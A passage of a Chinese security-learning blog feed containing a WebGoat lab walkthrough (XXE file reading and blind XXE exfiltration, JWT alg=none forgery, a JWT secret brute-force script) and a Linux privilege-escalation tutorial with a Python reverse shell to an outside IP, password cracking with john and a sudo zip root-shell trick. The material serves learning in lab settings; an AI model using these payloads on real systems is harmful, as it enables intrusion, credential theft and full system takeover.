src="https://img-blog.csdnimg.cn/20200816000721653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>直接构造简单的XML来提交</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE m0re [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY m0re <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;m0re;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为我是在windows系统中搭建的环境，所以读取C盘内容<br>如果是linux系统的话，就使用<code>file:///</code><br><img src="https://img-blog.csdnimg.cn/20200816002235579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第四关</font><br><font color=#999AAA >这次抓到的包是这样的<br><img src="https://img-blog.csdnimg.cn/20200816002549432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>有一点是，这个<code>Content-Type</code>是json，上一题是XML，所以把这里进行一下修改，就可以，然后XML实体就使用上一题的就可以<br><img src="https://img-blog.csdnimg.cn/20200816003022834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发包，成功</font><br><img src="https://img-blog.csdnimg.cn/20200816003118149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第七关Blind XXE assignment</font></p><p><font color=#999AAA >在webwolf上传外部XML文件<code>m0re.dtd</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span>  <span class="meta-string">&quot;&lt;!ENTITY m0re SYSTEM &#x27;http://127.0.0.1:8081/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200817113030131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >然后抓包修改，请求利用这个外部XML<br><img src="https://img-blog.csdnimg.cn/20200817114119981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:\Users\18101\.webgoat-8.0.0.M15\XXE/secret.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">zxcv</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:8081/files/webgoat/m0re.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%zxcv;</span></span><br><span class="line"><span class="meta">%payload;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;m0re;<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font color=#999AAA >解释：因为我的是windows系统来搭建的，中间除了一点小差错，是jdk版本的原因，导致靶场无法访问，所以我又换了一个版本相对较低的靶场。这个webwolf的默认端口是8081，所以payload里面是8081。<br><code>http://127.0.0.1:8081/files/webgoat/m0re.dtd</code>这个路径是<code>http://127.0.0.1:8081/files/&#123;username&#125;/&#123;filename&#125;</code>，其他的也没什么了。<br>blind XXE就是没有回显的，所以去webwolf中查就是了。<br><img src="https://img-blog.csdnimg.cn/20200817120512583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p><font color=#999AAA >显示的内容需要进行URL解码后提交评论。</p><p><img src="https://img-blog.csdnimg.cn/20200817120621642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="3-Authentication-Flaws"><a href="#3-Authentication-Flaws" class="headerlink" title="3.Authentication Flaws"></a>3.Authentication Flaws</h2><h3 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a>Authentication Bypasses</h3><p><font color=#999AAA >身份验证缺陷——看完前面lesson去做第一关不难，只需要进行尝试删除或者修改参数就可以了。这里是进行了修改，删除没有成功。<br><img src="https://img-blog.csdnimg.cn/20200817131951956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="JWT-tokens"><a href="#JWT-tokens" class="headerlink" title="JWT tokens"></a>JWT tokens</h3><p><font color=#999AAA >关于JWT tokens，之前好像是isCC有这么一道题，涉及的这个知识。之前题目是被不知名大佬搞坏了，所以没能复现成功，这次正好学习一下。</p><p><font color=#999AAA >尝试更改收到的token并通过更改token成为管理员用户。<br>token的组成，三部分：Header、Claims、Signature<br><img src="https://img-blog.csdnimg.cn/20200817143252541.png" alt="m0re" loading="lazy"><br><font color=#999AAA >而且token是经过base64编码过的。<br>用户获取token需要经过下面这一系列步骤：</p><p><img src="https://img-blog.csdnimg.cn/20200817144100191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >用户输入用户名和密码，提交登录信息给服务器，然后创建一个JWT返回给浏览器，浏览器将token发送到授权的Header头中，服务器检验token的值，从token中验明用户身份信息，验证身份后就会返回给用户相应的信息。<br><font color=#F22225 >第四关</font><br><font color=#999AAA >这一关，可能是环境的问题，抓包获取可能存在问题，抓取的数据包没有发现token，建议搭建环境还是去linux系统或者使用docker进行搭建吧。<br>这里说一下方法和知识点。<br>抓取到数据包后分别对token的三个部分进行base64解码，Header部分后面的是加密算法，可将其改为none<br>也就是图中部分<br><img src="https://img-blog.csdnimg.cn/20200817163027242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在第二部分查看到与admin相关的部分，然后就是将它的参数修改一下。这种类型的题目是JWT中的基础部分，只需要修改token的值就可以了。<br>然后复制回burp中，进行发包。思路大概就是这个样子。<br><font color=#F22225 >第五关</font><br><font color=#999AAA >JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a href="https://wws.lanzous.com/icZOyfpz24b">我用的字典，点击下载</a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。<br>python脚本——来自freebuf大佬阿信</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = R<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;C:\\Users\\18101\\Desktop\\m0re.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                print(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                print(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                print(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! nothing be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><font color=#999AAA >可能存在的错误：就是需要导入两个模块，分别是<code>termcolor</code>和<code>jwt</code><br><font color=#F22225 >这里有个坑就是，模块安装完后，还是会报错</font><br><code> module &#39;jwt&#39; has no attribute &#39;decode&#39;</code><br>查阅资料了解到python的模块中有<code>jwt</code>和<code>pyjwt</code>两个模块都是引用的<code>jwt</code>，其实不一样，这里使用的是<code>pyjwt</code>所以再安装<code>pyjwt</code>这个模块就好了。<br>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200817162355710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >记得将username处的tom改为WebGoat，下面的victory也填入。<br><img src="https://img-blog.csdnimg.cn/20200817182440855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>复制到提交处，就可以了。(PS：但是我的环境可能是很有问题的，重新搭建好几遍了，还是答案不对)<br>可以参考一下这位师傅的博客，过程没问题，就是答案提交了不正确。也不纠结了。pass！参考链接——<a href="https://www.jianshu.com/p/d2f9815758f4">https://www.jianshu.com/p/d2f9815758f4</a><br><font color=#F22225 >第七关Refreshing a token</font><br><font color=#999AAA ></p><p>点击这里查看日志。<br><img src="https://img-blog.csdnimg.cn/20200817182823546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在日志文件中发现历史记录的token，也就是过期的，和提交页面的URL，如下：<br><img src="https://img-blog.csdnimg.cn/20200817183007750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>解码这个token，然后发现缺少了typ，既然是已经过期了的，那么时间肯定是不合适的。查阅资料了解到token的时间设定</p><blockquote><p>其中iat是token生成的时间，exp是token失效的时间，也就是直接改exp就行了。这个时间是根据1970计算机的时间纪元来计算的，也就是得知道当前的时间是多少，</p></blockquote><p>回到主页面，其中除了checkout，其他的点击了都是没有其他效果的。<br><img src="https://img-blog.csdnimg.cn/20200818184747661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>所以就只能选择在这个地方入手了。<br>思路：抓包，修改token。</p><p><img src="https://img-blog.csdnimg.cn/20200818210412128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>返回不是用户tom，所以还是用到那个过期的token，但是日期是不正确的，<br><img src="https://img-blog.csdnimg.cn/20200818212605852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>所以需要获取当前时间，然后进行编码。<br>时间获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">print(time.time())</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200818210558583.png#pic_center" alt="m0re" loading="lazy"><br>将这个时间加长一点。就可以变为有效期的token了。因为原本的token默认使用<code>HS512</code>来hash，还需要secret值，爆破方式上一关的脚本可以。然后再进行base64编码。<br>懒得爆破了，所以就学习知乎大师傅的方法，直接将不hash，直接将alg改为None。然后进行base64编码。后面的签名也可以不加，直接下面两种组合，构成payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;None&quot;</span>&#125;==&gt;eyJhbGciOiJOb25lIn0=</span><br><span class="line">&#123;<span class="string">&quot;iat&quot;</span>:1526131411,<span class="string">&quot;exp&quot;</span>:1597757030,<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;Tom&quot;</span>&#125;==&gt;eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTU5Nzc1NzAzMCwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ==</span><br></pre></td></tr></table></figure><p>提交的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIn0=.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTU5Nzc1NzAzMCwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ==.</span><br></pre></td></tr></table></figure><p>不要忘记了最后的“点”，那是分割符。<br>复制token，粘贴到</p><p><img src="https://img-blog.csdnimg.cn/20200818211815343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>可以看到返回成功了，浏览器中也显示过关。</p><p><img src="https://img-blog.csdnimg.cn/20200818211031949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第八关Final challenges</font><br>参考上一关，方法一样。能做出来。<br>首先抓包，在这个位置找到token，然后去修改就可以了。<br><img src="https://img-blog.csdnimg.cn/20200818235525967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发包，成功。</p><p><img src="https://img-blog.csdnimg.cn/2020081823541586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >这个靶场确实很好，综合漏洞靶场，学到了许多知识，先记录一部分，后面再另写一篇。继续加油。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统提权———基于已经拿到www-data权限</title>
      <link href="/2020/09/01/linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8E%E5%B7%B2%E7%BB%8F%E6%8B%BF%E5%88%B0www-data%E6%9D%83%E9%99%90/"/>
      <url>/2020/09/01/linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8E%E5%B7%B2%E7%BB%8F%E6%8B%BF%E5%88%B0www-data%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>前言：上次学习利用目录遍历漏洞获取了一个反弹的webshell，但是权限是www-data，不是root权限，所以这次学习提权，拿到root权限。</p><h2 id="提权介绍"><a href="#提权介绍" class="headerlink" title="提权介绍"></a>提权介绍</h2><p>往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。<br>提权前提：</p><ul><li>已经拿到低权shell</li><li>被入侵的机器上面有nc，python，perl等非常常见的工具</li><li>有权限上传文件和下载文件</li></ul><p>学习环境依然是上次的shell获取的www-data权限</p><h1 id="提权方式"><a href="#提权方式" class="headerlink" title="提权方式"></a>提权方式</h1><h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>内核漏洞一般是首选考虑的，先查看是否可以使用内核漏洞进行提权。先对系统做个了解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看发行版本</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200808002259701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到发行版本是<code>Ubuntu 12.04.5</code><br>寻找内核溢出代码使用searchsploit<br>但是发现并没有，可以适合这个版本的漏洞模块；但是有12.04的，不过不行；<br><img src="https://img-blog.csdnimg.cn/20200808002340356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有这个，所以没办法利用；如果存在可以利用的，那么使用方法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc xxx.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure><p>这个是内核溢出的提权，不过一般用不上。</p><h2 id="明文root密码提权"><a href="#明文root密码提权" class="headerlink" title="明文root密码提权"></a>明文root密码提权</h2><p>大多linux系统的密码都和<code>/etc/passwd</code>、<code>/etc/shadow</code>这两个配置文件相关的；passwd里面储存了用户，shadow里面是密码的hash；且passwd是全用户可读，root可写。shadow是仅root可以进行读写的。<br>破解linux用户名和对应的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd  /etc/shadow</span><br><span class="line">unshadow passwd shadow &gt; cracked</span><br><span class="line">john cracked</span><br></pre></td></tr></table></figure><p>使用John这个工具来破解。<br>到kali中查看这两个文件，passwd可以查看，shadow是无法查看的<br><img src="https://img-blog.csdnimg.cn/20200808002405453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以此方法也不行，不过倒是可以在root权限下查看密码(前提是不知道root密码)</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是<code>/etc/</code>内系统的计划任务可以被列出<br>默认这些程序以root权限执行，如果刚好遇到一个把其中脚本配置成可以任意用户可写的，这个时候就可以修改脚本等回连rootshell；如果定时执行的文件时python脚本，可以使用下面的脚本来替换之前的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s=socket.socekt(sicket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;10.0.2.4&quot;</span>,<span class="string">&quot;4444&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>测试时查看<code>/etc/crontab</code>发现并没有可写权限的文件<br><img src="https://img-blog.csdnimg.cn/20200808002446833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以此方法行不通。</p><h2 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h2><p>很多管理员会重读使用密码，因此数据库或者web后台的密码也许就是root密码。</p><p>有了疑似root密码，第一时间想到ssh登录，但是ssh很可能禁止root登录，或者是防火墙规则等因素排除。之前已经得到一个低权限的shell，但是直接在低权限里使用sudo是不奏效的。出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入，也就是说sudo在输入密码的时候本质是读取键盘，而不是bash里面的字符。因此要输入密码，还需要一个终端设备。python有这种功能的，就是模拟化终端，输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200808002524296.png" alt="m0re" loading="lazy"></p><p>可以看到是已经启动了虚拟终端<br>然后找到了一些信息，因为是靶场，而且是学习提权的，这个寻找信息的过程就不写了。<br>找到一个用户名为<code>zico</code>密码为<code>sWfCsfJSPV9H3AmQzw8</code>的一个用户。<br>而日是开放了ssh服务的，所以可以直接进行ssh登录<br><img src="https://img-blog.csdnimg.cn/20200808002545584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>看到了登录成功，密码正确。</p><p>利用zip进行提权<br><code>sudo -l</code>查看了当前可以使用root提权的命令信息。<br>返回以下结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> zico on this host:</span><br><span class="line">    env_reset, exempt_group=admin,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User zico may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /bin/tar</span><br><span class="line">    (root) NOPASSWD: /usr/bin/zip</span><br></pre></td></tr></table></figure><p>可以使用zip进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch exploit</span><br><span class="line">sudo -u root zip exploit.zip exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p>发现得到了root权限<br><img src="https://img-blog.csdnimg.cn/202008080026057.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="总结："><a href="#总结：" class="headerlink" 